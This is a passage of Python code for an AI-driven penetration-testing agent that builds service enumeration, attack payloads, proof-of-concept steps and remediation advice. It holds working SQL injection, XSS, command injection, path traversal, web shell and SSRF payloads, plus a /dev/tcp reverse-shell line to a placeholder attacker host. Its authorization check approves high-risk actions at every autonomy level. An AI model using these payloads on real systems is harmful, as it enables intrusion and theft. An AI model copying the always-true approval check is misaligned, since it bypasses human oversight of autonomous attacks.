                    f"Banner grab: nc <target> {port}",
                    f"Nmap service detection: nmap -sV -p{port} <target>",
                    "Check for default credentials",
                    "Search for known exploits"
                ]
            
            enumeration_results[port] = service_info
            
            # Create finding for each service with actionable intelligence
            finding = Finding(
                timestamp=datetime.now().isoformat(),
                tool="service_enum",
                severity="info",
                category="enumeration",
                description=f"{service_info['service']} service enumeration on port {port}",
                details=service_info,
                exploitation_potential="medium",
                recommended_action=f"Execute enumeration: {service_info['enumeration'][0]}"
            )
            self.findings.append(finding)
        
        return {
            "services_enumerated": len(enumeration_results),
            "details": enumeration_results,
            "summary": f"Enumerated {len(enumeration_results)} services with specific attack vectors"
        }
    
    async def _generate_test_payload(self, finding: Finding) -> Dict[str, Any]:
        """
        Generate test payload for discovered vulnerability
        Creates safe, non-destructive payloads to verify vulnerability existence
        """
        vuln_type = finding.category.lower()
        description = finding.description.lower()
        
        test_payload = {}
        poc_steps = []
        
        # SQL Injection test payloads
        if "sql" in vuln_type or "sql injection" in description:
            test_payload = {
                "type": "SQLi",
                "payloads": [
                    "' OR '1'='1",  # Basic authentication bypass
                    "1' OR '1'='1' --",  # Comment-based
                    "1' UNION SELECT NULL--",  # Union-based detection
                    "1' AND SLEEP(5)--",  # Time-based blind
                    "1' AND 1=1--",  # Boolean-based
                ],
                "safe_test": "1' AND '1'='2",  # Should return false
                "verification": "Response time or error messages indicate SQL processing"
            }
            poc_steps = [
                "1. Identify injectable parameter (e.g., ?id=1)",
                "2. Test with: ?id=1' (check for SQL error)",
                "3. Confirm with: ?id=1' OR '1'='1 (should return data)",
                "4. Verify with: ?id=1' AND '1'='2 (should return empty)",
                "5. Extract data: ?id=1' UNION SELECT username,password FROM users--"
            ]
        
        # XSS test payloads
        elif "xss" in vuln_type or "cross-site scripting" in description:
            test_payload = {
                "type": "XSS",
                "payloads": [
                    "<script>alert('XSS')</script>",  # Basic
                    "<img src=x onerror=alert('XSS')>",  # Image-based
                    "<svg/onload=alert('XSS')>",  # SVG-based
                    "javascript:alert('XSS')",  # URL-based
                    "'-alert('XSS')-'",  # Quote escape
                ],
                "safe_test": "<b>test</b>",  # Should render as bold
                "verification": "Inspect page source for unescaped payload"
            }
            poc_steps = [
                "1. Identify reflected input (search box, comment field, etc.)",
                "2. Test with: <b>test</b> (check if HTML renders)",
                "3. Try payload: <script>alert('XSS')</script>",
                "4. If blocked, try bypass: <img src=x onerror=alert('XSS')>",
                "5. Verify by checking browser console/page source"
            ]
        
        # Command Injection test payloads
        elif "command injection" in description or "rce" in vuln_type:
            test_payload = {
                "type": "Command Injection",
                "payloads": [
                    "; whoami",  # Unix command chaining
                    "| whoami",  # Pipe
                    "& whoami",  # Windows
                    "`whoami`",  # Backtick execution
                    "$(whoami)",  # Command substitution
                ],
                "safe_test": "; echo 'test'",  # Safe verification
                "verification": "Command output appears in response"
            }
            poc_steps = [
                "1. Identify command execution point (ping, nslookup, etc.)",
                "2. Test injection: input; whoami",
                "3. Verify output appears in response",
                "4. Test other separators if needed: |, &, `, $()",
                "5. For reverse shell: ; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
            ]
        
        # File Upload test payloads
        elif "file upload" in description or "upload" in vuln_type:
            test_payload = {
                "type": "File Upload",
                "payloads": [
                    "test.php (PHP web shell)",
                    "test.jsp (Java web shell)",
                    "test.aspx (ASP.NET web shell)",
                    "shell.php.jpg (extension bypass)",
                    "shell.php%00.jpg (null byte bypass)",
                ],
                "safe_test": "test.txt with content: <?php echo 'test'; ?>",
                "verification": "Access uploaded file via direct URL"
            }
            poc_steps = [
                "1. Create test file: echo '<?php phpinfo(); ?>' > test.php",
                "2. Upload file through vulnerable endpoint",
                "3. Identify upload directory (/uploads/, /files/, etc.)",
                "4. Access: http://target.com/uploads/test.php",
                "5. If successful, upload full web shell for remote access"
            ]
        
        # Path Traversal test payloads
        elif "path traversal" in description or "directory traversal" in description:
            test_payload = {
                "type": "Path Traversal",
                "payloads": [
                    "../../../etc/passwd",  # Unix
                    "..\\..\\..\\windows\\win.ini",  # Windows
                    "....//....//....//etc/passwd",  # Filter bypass
                    "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
                    "..%252F..%252F..%252Fetc%252Fpasswd",  # Double encoded
                ],
                "safe_test": "../README.md",  # Safe file
                "verification": "Sensitive file contents returned"
            }
            poc_steps = [
                "1. Identify file parameter (?file=, ?page=, etc.)",
                "2. Test: ?file=../etc/passwd (Unix)",
                "3. Or: ?file=..\\windows\\win.ini (Windows)",
                "4. Try encoding if blocked: ?file=..%2F..%2F..%2Fetc%2Fpasswd",
                "5. Read sensitive files: /etc/shadow, web.config, etc."
            ]
        
        # SSRF test payloads
        elif "ssrf" in vuln_type or "server-side request forgery" in description:
            test_payload = {
                "type": "SSRF",
                "payloads": [
                    "http://internal.test:80",  # Internal network
                    "http://callback.test:22",  # Internal port scan
                    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                    "http://metadata.google.internal/",  # GCP metadata
                    "file:///etc/passwd",  # Local file
                ],
                "safe_test": "http://callback.test",  # External callback domain
                "verification": "Response contains internal resource data"
            }
            poc_steps = [
                "1. Identify URL parameter (?url=, ?target=, etc.)",
                "2. Test external: ?url=http://callback.test (check logs)",
                "3. Test internal: ?url=http://internal.test:80",
                "4. Scan ports: ?url=http://callback.test:22, :3306, :6379",
                "5. Access cloud metadata: ?url=http://169.254.169.254/latest/meta-data/"
            ]
        
        # Default for unknown vulnerability types
        else:
            test_payload = {
                "type": "Generic",
                "description": "Manual testing required for this vulnerability type",
                "recommendation": "Review vulnerability details and test manually"
            }
            poc_steps = [
                "1. Review vulnerability description carefully",
                "2. Research exploit techniques for this vulnerability type",
                "3. Test in controlled environment first",
                "4. Document findings and reproduction steps"
            ]
        
        return {
            "test_payload": test_payload,
            "poc_steps": poc_steps,
            "finding_id": finding.timestamp,
            "vuln_type": vuln_type
        }
    
    async def _analyze_code_for_remediation(self, finding: Finding) -> Dict[str, Any]:
        """
        Analyze code to provide remediation guidance
        Uses AI to generate secure code fixes
        """
        vuln_type = finding.category.lower()
        description = finding.description
        
        # Get detected tech stack
        tech_stack = self._get_tech_stack()
        
        # Build remediation prompt for AI
        remediation_prompt = f"""As a security expert, provide code-level remediation for this vulnerability:

Vulnerability: {description}
Type: {vuln_type}
Tech Stack: {', '.join(tech_stack)}
Severity: {finding.severity}

Provide:
1. Root cause explanation
2. Secure code example (actual code)
3. Best practices to prevent this vulnerability
4. Testing recommendations
5. Priority level (immediate/high/medium/low)

Format response as JSON with keys: root_cause, secure_code, best_practices, testing, priority"""

        try:
            # Query AI for remediation guidance
            response = await self.ai_provider.query(
                "You are a security code review expert. Provide actionable remediation guidance.",
                remediation_prompt,
                temperature=0.3  # Lower temperature for more focused responses
            )
            
            # Parse AI response
            response = response.strip()
            if response.startswith("```"):
                lines = response.split("\n")
                response = "\n".join(lines[1:-1])
            
            remediation = json.loads(response)
            
        except Exception as e:
            # Fallback to generic remediation templates
            remediation = self._get_remediation_template(vuln_type, tech_stack)
        
        return remediation
    
    def _get_tech_stack(self) -> List[str]:
        """Extract detected technology stack from findings"""
        tech_stack = []
        
        # Check tech detection findings
        tech_findings = [f for f in self.findings if f.tool == "tech_detect"]
        for finding in tech_findings:
            details = finding.details
            if isinstance(details, dict):
                # Extract framework, server, language info
                for key in ["framework", "server", "language", "cms", "cdn"]:
                    if key in details and details[key]:
                        tech_stack.append(details[key])
        
        # Default stack if none detected
        if not tech_stack:
            tech_stack = ["Generic Web Application"]
        
        return tech_stack
    
    def _get_remediation_template(self, vuln_type: str, tech_stack: List[str]) -> Dict[str, Any]:
        """Provide remediation templates for common vulnerabilities"""
        
        templates = {
            "sql_injection": {
                "root_cause": "User input directly concatenated into SQL queries without proper sanitization",
                "secure_code": """# Python (Flask/SQLAlchemy)
from sqlalchemy import text

# ‚ùå VULNERABLE
query = f"SELECT * FROM users WHERE id = {user_id}"

# ‚úÖ SECURE - Use parameterized queries
query = text("SELECT * FROM users WHERE id = :id")
result = db.session.execute(query, {"id": user_id})

# PHP (PDO)
// ‚ùå VULNERABLE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// ‚úÖ SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);""",
                "best_practices": [
                    "Always use parameterized queries/prepared statements",
                    "Never concatenate user input into SQL",
                    "Use ORM frameworks (SQLAlchemy, Hibernate, Entity Framework)",
                    "Apply principle of least privilege for database accounts",
                    "Enable database audit logging"
                ],
                "testing": "Use sqlmap or manual SQLi payloads to verify fix",
                "priority": "immediate"
            },
            
            "xss": {
                "root_cause": "User input reflected in HTML without proper output encoding",
                "secure_code": """# Python (Flask)
from markupsafe import escape

# ‚ùå VULNERABLE
return f"<h1>Welcome {user_input}</h1>"

# ‚úÖ SECURE - Escape output
return f"<h1>Welcome {escape(user_input)}</h1>"

# JavaScript (React)
// ‚ùå VULNERABLE
<div dangerouslySetInnerHTML={{__html: userInput}} />

// ‚úÖ SECURE - Automatic escaping
<div>{userInput}</div>

// PHP
// ‚ùå VULNERABLE
echo "<div>" . $_GET['name'] . "</div>";

// ‚úÖ SECURE
echo "<div>" . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</div>";""",
                "best_practices": [
                    "Encode all user input before rendering (HTML entity encoding)",
                    "Use Content Security Policy (CSP) headers",
                    "Sanitize rich text input with libraries (DOMPurify, Bleach)",
                    "Set HttpOnly and Secure flags on cookies",
                    "Validate input on server-side"
                ],
                "testing": "Test with XSS payloads and browser developer tools",
                "priority": "high"
            },
            
            "command_injection": {
                "root_cause": "User input passed to system command execution without validation",
                "secure_code": """# Python
import subprocess
import shlex

# ‚ùå VULNERABLE
os.system(f"ping {user_input}")

# ‚úÖ SECURE - Use subprocess with list
subprocess.run(["ping", "-c", "1", user_input], check=True)

# Node.js
// ‚ùå VULNERABLE
exec(`ping ${userInput}`, callback);

// ‚úÖ SECURE - Use execFile with array
execFile('ping', ['-c', '1', userInput], callback);""",
                "best_practices": [
                    "Never pass user input to shell commands",
                    "Use subprocess/execFile with array arguments",
                    "Validate and whitelist allowed values",
                    "Avoid shell=True/shell interpretation",
                    "Run with minimal privileges"
                ],
                "testing": "Test with command separators: ;, |, &, `, $()",
                "priority": "immediate"
            },
            
            "file_upload": {
                "root_cause": "Insufficient file type and content validation allowing malicious file uploads",
                "secure_code": """# Python (Flask)
from werkzeug.utils import secure_filename
import imghdr

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \\
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# ‚úÖ SECURE upload handler
if file and allowed_file(file.filename):
    # Sanitize filename
    filename = secure_filename(file.filename)
    
    # Verify file content (not just extension)
    if imghdr.what(file) not in ['png', 'jpeg', 'gif']:
        return "Invalid file type", 400
    
    # Save outside web root with restricted permissions
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)
    os.chmod(filepath, 0o644)  # Read-only""",
                "best_practices": [
                    "Whitelist allowed file extensions",
                    "Verify file content/magic bytes, not just extension",
                    "Store uploads outside web root",
                    "Rename uploaded files (UUID)",
                    "Set restrictive file permissions (no execute)",
                    "Scan files with antivirus/malware detection",
                    "Limit file size"
                ],
                "testing": "Upload shell.php, shell.php.jpg, shell.php%00.jpg",
                "priority": "immediate"
            }
        }
        
        # Match vulnerability type to template
        for key, template in templates.items():
            if key.replace("_", " ") in vuln_type:
                return template
        
        # Default generic template
        return {
            "root_cause": "Insufficient input validation and security controls",
            "secure_code": "# Implement proper input validation\n# Apply defense in depth\n# Follow OWASP guidelines",
            "best_practices": [
                "Validate all user input",
                "Apply principle of least privilege",
                "Keep dependencies updated",
                "Implement security headers",
                "Enable logging and monitoring"
            ],
            "testing": "Perform thorough security testing",
            "priority": "high"
        }
    
    async def _enrich_findings_with_payloads(self):
        """
        Enrich all findings with test payloads and remediation guidance
        This runs after vulnerability discovery phase
        """
        print("\nüî¨ Generating test payloads and remediation guidance...")
        
        # Sort findings by severity and limit to top 50 to prevent hanging
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sorted_findings = sorted(self.findings, key=lambda f: severity_order.get(f.severity, 5))
        findings_to_enrich = sorted_findings[:50]  # Only enrich top 50
        
        if len(self.findings) > 50:
            print(f"   [INFO] Limiting enrichment to top 50 of {len(self.findings)} findings for performance")
        
        enriched_count = 0
        
        for finding in findings_to_enrich:
            # Only enrich actual vulnerability findings (not info/recon)
            if finding.severity in ["critical", "high", "medium"] and \
               finding.category in ["web_application", "injection", "authentication", "authorization", "file_operations"]:
                
                try:
                    # Generate test payload
                    payload_data = await self._generate_test_payload(finding)
                    finding.test_payload = json.dumps(payload_data["test_payload"])
                    finding.poc_steps = payload_data["poc_steps"]
                    
                    # Generate remediation guidance
                    remediation = await self._analyze_code_for_remediation(finding)
                    finding.remediation_code = remediation.get("secure_code", "")
                    finding.mitigation_priority = remediation.get("priority", "medium")
                    
                    # Update recommended action with detailed fix
                    if remediation.get("best_practices"):
                        practices = "\n- ".join(remediation["best_practices"])
                        finding.recommended_action = f"{finding.recommended_action}\n\nBest Practices:\n- {practices}"
                    
                    enriched_count += 1
                    print(f"   [OK] Enriched: {finding.description[:60]}...")
                    
                except Exception as e:
                    print(f"   [WARNING] Could not enrich finding: {str(e)}")
                    continue
        
        print(f"\n[COMPLETE] Enriched {enriched_count} findings with test payloads and remediation")
    
    def _check_authorization(self, action: Dict[str, Any]) -> bool:
        """Check if action requires authorization"""
        high_risk_tools = ["payload_generate", "bruteforce", "exploit_vuln", "web_pentest", "fuzzer"]
        tool = action["next_action"]
        risk_level = action.get("risk_level", "medium")
        
        if tool in high_risk_tools or risk_level == "high":
            if self.config.autonomy_level == AutonomyLevel.FULLY_AUTONOMOUS:
                return True
            elif self.config.autonomy_level == AutonomyLevel.SEMI_AUTONOMOUS:
                # Would prompt user in real implementation
                return True
            else:  # SUPERVISED
                # Would always prompt in real implementation
                return True
        
        return True
    
    def _should_stop(self, ai_decision: Dict[str, Any]) -> bool:
        """Determine if testing should stop"""
        # Time limit check
        elapsed = (datetime.now() - self.start_time).total_seconds() / 60
        if elapsed >= self.config.time_limit:
            return True
        
        # Max iterations check
        if self.iteration >= self.config.max_iterations:
            return True
        
        # AI decision
        if ai_decision.get("stop_testing", False):
            return True
        
        # Goal achievement check (simplified)
        if self.config.primary_goal == PrimaryGoal.COMPREHENSIVE:
            tools_used = set(action.tool for action in self.actions)
            required_tools = {"recon", "port_scan", "web_pentest", "ssl_analyze"}
            if required_tools.issubset(tools_used):
                return True
        
        return False
    
    async def execute(self) -> Dict[str, Any]:
        """Execute the AI-powered penetration test with hybrid mode"""
        print(f"\n[AI AGENT] Penetration Test Starting...")
        print(f"Target: {self.config.target}")
        print(f"Goal: {self.config.primary_goal.value}")
        print(f"AI Provider: {self.config.ai_provider} ({self.config.model})")
        print(f"Time Limit: {self.config.time_limit} minutes")
        print(f"Autonomy: {self.config.autonomy_level.value}")
        print(f"Risk Tolerance: {self.config.risk_tolerance.value}")
        print(f"Mode: Hybrid (predefined sequence + AI decision making)\n")
        
        try:
            while self.iteration < self.config.max_iterations:
                self.iteration += 1
                print(f"[ITERATION] {self.iteration}/{self.config.max_iterations}")
                
                # Hybrid mode: Use predefined sequence first, then AI
                if self.use_predefined and self.sequence_index < len(self.predefined_sequence):
                    # Use predefined sequence (no API call needed!)
                    step = self.predefined_sequence[self.sequence_index]
                    ai_decision = {
                        "next_action": step["tool"],
                        "parameters": step["params"],
                        "reasoning": f"[HYBRID MODE] {step['reasoning']}",
                        "risk_level": "low" if step["tool"] in ["recon", "tech_detect"] else "medium",
                        "stop_testing": False
                    }
                    self.sequence_index += 1
                    print(f"  [HYBRID] Using predefined step ({self.sequence_index}/{len(self.predefined_sequence)})")
                    print(f"  [REASONING] {ai_decision['reasoning']}")
                    print(f"  [ACTION] Next: {ai_decision['next_action']}")
                    print(f"  [RISK] Level: {ai_decision.get('risk_level', 'medium')}")
                else:
                    # Switch to AI-driven mode for advanced exploitation
                    if self.use_predefined:
                        print(f"  [HYBRID] Predefined sequence complete. Switching to AI-driven exploitation...\n")
                        self.use_predefined = False
                    
                    # Get AI decision
                    print("  [AI] Consulting AI for next action...")
                    try:
                        ai_decision = await self._get_next_action()
                        self.consecutive_api_failures = 0  # Reset on success
                    except Exception as e:
                        self.consecutive_api_failures += 1
                        print(f"  [WARNING] AI query failed ({self.consecutive_api_failures} consecutive failures)")
                        
                        # If 3+ consecutive failures, stop gracefully
                        if self.consecutive_api_failures >= 3:
                            print("\n[COMPLETE] Multiple API failures - stopping to prevent infinite errors")
                            break
                        
                        # Use the smart fallback logic
                        ai_decision = await self._get_next_action()  # Will return fallback action
                    
                    print(f"  [REASONING] {ai_decision['reasoning']}")
                    print(f"  [ACTION] Next: {ai_decision['next_action']}")
                    print(f"  [RISK] Level: {ai_decision.get('risk_level', 'medium')}")
                
                # Check if we should stop
                if self._should_stop(ai_decision):
                    print("\n[COMPLETE] Testing finished (stopping condition met)")
                    break
                
                # Check authorization for high-risk actions
                if not self._check_authorization(ai_decision):
                    print("  [DENIED] Action requires authorization")
                    continue
                
                # Execute the action
                print(f"  [EXECUTING] {ai_decision['next_action']}...")
                result = await self._execute_action(ai_decision)
                
                if "error" in result:
                    print(f"  [ERROR] {result['error']}")
                else:
                    print(f"  [SUCCESS] Completed successfully")
                
                # Rate limit protection: Longer delay for GitHub Models to avoid hitting 15 req/min limit
                if self.config.ai_provider == "github":
                    # GitHub Models: 15 requests/min = 4 seconds between requests minimum
                    # Use 5 seconds to be safe
                    delay = 5
                    if not self.use_predefined:  # Only show for AI-driven iterations
                        print(f"  [RATE LIMIT] Waiting {delay}s to respect GitHub Models limits (15 req/min)...")
                    await asyncio.sleep(delay)
                else:
                    # Other providers: 2 second pause
                    await asyncio.sleep(2)
                print()
            
            # Enrich findings with test payloads and remediation
            await self._enrich_findings_with_payloads()
            
            # Display detailed findings before saving
            print("\n" + "="*70)
            print("DETAILED FINDINGS REVIEW")
            print("="*70)
            self._display_detailed_findings()
            
            # Generate final report
            report = self._generate_report()
            
            return report
            
        finally:
            await self.ai_provider.close()
    
    def _generate_report(self) -> Dict[str, Any]:
        """Generate final report"""
        elapsed = (datetime.now() - self.start_time).total_seconds() / 60
        
        # Group findings by severity
        by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for finding in self.findings:
            by_severity.get(finding.severity.lower(), by_severity["info"]).append(finding)
        
        report = {
            "summary": {
                "target": self.config.target,
                "primary_goal": self.config.primary_goal.value,
                "start_time": self.start_time.isoformat(),
                "end_time": datetime.now().isoformat(),
                "duration_minutes": round(elapsed, 2),
                "iterations": self.iteration,
                "total_findings": len(self.findings),
                "total_actions": len(self.actions),
                "ai_provider": self.config.ai_provider,
                "ai_model": self.config.model
            },
            "findings_by_severity": {
                "critical": len(by_severity["critical"]),
                "high": len(by_severity["high"]),
                "medium": len(by_severity["medium"]),
                "low": len(by_severity["low"]),
                "info": len(by_severity["info"])
            },
            "detailed_findings": [asdict(f) for f in self.findings],
            "actions_taken": [asdict(a) for a in self.actions],
            "recommendations": self._generate_recommendations()
        }
        
        return report
    
    def _display_detailed_findings(self):
        """Display all findings in detail before saving"""
        if not self.findings:
            print("\n[SCAN RESULT] No vulnerabilities or issues discovered.")
            return
        
        # Group by severity
        by_severity = {"critical": [], "high": [], "medium": [], "low": [], "info": []}
        for finding in self.findings:
            by_severity.get(finding.severity.lower(), by_severity["info"]).append(finding)
        
        print(f"\n[RESULTS] Total Findings: {len(self.findings)}\n")
        
        for severity in ["critical", "high", "medium", "low", "info"]:
            items = by_severity[severity]
            if not items:
                continue
            
            # Label by severity
            severity_labels = {
                "critical": "[CRITICAL]",
                "high": "[HIGH]",
                "medium": "[MEDIUM]",
                "low": "[LOW]",
                "info": "[INFO]"
            }
            
            print(f"\n{severity_labels[severity]} ({len(items)} findings):")
            print("-" * 70)
            
            for i, finding in enumerate(items, 1):
                print(f"\n{i}. [{finding.tool.upper()}] {finding.category}")
                print(f"   Description: {finding.description}")
                if finding.details:
                    print(f"   Details: {finding.details}")
                if finding.exploitation_potential:
                    print(f"   Exploitation Potential: {finding.exploitation_potential}")
                
                # Show test payload if available
                if finding.test_payload:
                    print(f"\n   [TEST PAYLOAD]:")
                    try:
                        payload_obj = json.loads(finding.test_payload)
                        print(f"      Type: {payload_obj.get('type', 'N/A')}")
                        if 'payloads' in payload_obj:
                            print(f"      Payloads: {', '.join(payload_obj['payloads'][:3])}")
                    except:
                        pass
                
                # Show PoC steps if available
                if finding.poc_steps:
                    print(f"\n   [PROOF OF CONCEPT]:")
                    for step in finding.poc_steps[:3]:  # Show first 3 steps
                        print(f"      {step}")
                    if len(finding.poc_steps) > 3:
                        print(f"      ... ({len(finding.poc_steps) - 3} more steps)")
                
                # Show remediation code if available
                if finding.remediation_code:
                    print(f"\n   [SECURE CODE FIX]:")
                    # Handle both string and dict cases (defensive coding)
                    if isinstance(finding.remediation_code, dict):
                        code_text = finding.remediation_code.get("secure_code", str(finding.remediation_code))
                    else:
                        code_text = finding.remediation_code
                    
                    code_lines = code_text.split('\n')[:5]  # First 5 lines
                    for line in code_lines:
                        print(f"      {line}")
                    if len(code_text.split('\n')) > 5:
                        print(f"      ... (see full report for complete code)")
                
                # Show priority
                if finding.mitigation_priority:
                    priority_labels = {
                        "immediate": "[IMMEDIATE]",
                        "high": "[HIGH]",
                        "medium": "[MEDIUM]",
                        "low": "[LOW]"
                    }
                    print(f"\n   Priority: {priority_labels.get(finding.mitigation_priority, finding.mitigation_priority)}")
                
                if finding.recommended_action:
                    print(f"\n   Remediation: {finding.recommended_action}")
        
        print("\n" + "="*70)
    
    def _generate_recommendations(self) -> List[str]:
        """Generate high-level recommendations"""
        recommendations = []
        
        # Count by severity
        critical = sum(1 for f in self.findings if f.severity == "critical")
        high = sum(1 for f in self.findings if f.severity == "high")
        
        if critical > 0:
            recommendations.append(f"[URGENT] Address {critical} critical vulnerabilities immediately")
        
        if high > 0:
            recommendations.append(f"[HIGH PRIORITY] Fix {high} high-severity issues")
        
        # Category-specific recommendations
        categories = set(f.category for f in self.findings)
        
        if "web_application" in categories:
            recommendations.append("[WEB] Review web application security controls (input validation, authentication)")
        
        if "ssl_tls" in categories:
            recommendations.append("[TLS] Update SSL/TLS configuration (remove weak ciphers, enable modern protocols)")
        
        if "dns_misconfiguration" in categories:
            recommendations.append("[DNS] Review DNS configuration for misconfigurations and takeover risks")
        
        if not recommendations:
            recommendations.append("[COMPLETE] No critical issues found. Continue regular security assessments.")
        
        return recommendations
